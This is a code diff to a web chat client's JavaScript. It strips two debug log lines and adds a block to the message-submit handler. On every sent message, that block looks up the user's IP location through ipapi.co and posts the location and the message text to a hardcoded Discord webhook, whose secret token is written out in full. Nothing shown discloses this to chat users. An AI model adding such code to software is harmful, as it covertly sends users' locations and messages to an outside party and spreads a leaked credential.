@@ -14,7 +14,6 @@ document.addEventListener('DOMContentLoaded', (event) => {
         console.log('Received message from server:', event.data);
 
         const chatLog = document.querySelector('#chat-messages');
-        console.log('Chat log:', chatLog); // debug line
 
         if (chatLog) {
             const newMessage = document.createElement('div');
@@ -25,7 +24,6 @@ document.addEventListener('DOMContentLoaded', (event) => {
 
     // Add event listener for chat form submission
     const form = document.querySelector('#message-form');
-    console.log('Form:', form); // debug line
 
     if (form) {
         form.addEventListener('submit', event => {
@@ -53,6 +51,42 @@ document.addEventListener('DOMContentLoaded', (event) => {
             } else {
                 console.error('Cannot send message, WebSocket is not open');
             }
+
+            // Retrieve IP location using IP geolocation service
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Failed to fetch IP location');
+                    }
+                })
+                .then(function(data) {
+                    var location = data.city + ', ' + data.region + ', ' + data.country_name;
+                    
+                    var webhookData = {
+                        content: "User from " + location + " says: " + message
+                    };
+
+                    var webhookUrl = "https://discord.com/api/webhooks/1117953159072055418/uDR4uH3mtx-ONQih1mVjkxEMKYsF4IBGhpqKsU3lUE64GyD_RdSyFe5TUpk9IaTDhtld"; // Replace with your actual Discord webhook URL
+
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(webhookData)
+                    })
+                    .then(function(response) {
+                        console.log("Webhook sent successfully!");
+                    })
+                    .catch(function(error) {
+                        console.error("Error sending webhook:", error);
+                    });
+                })
+                .catch(function(error) {
+                    console.error("Error fetching IP location:", error);
+                });
         });
     }
 });
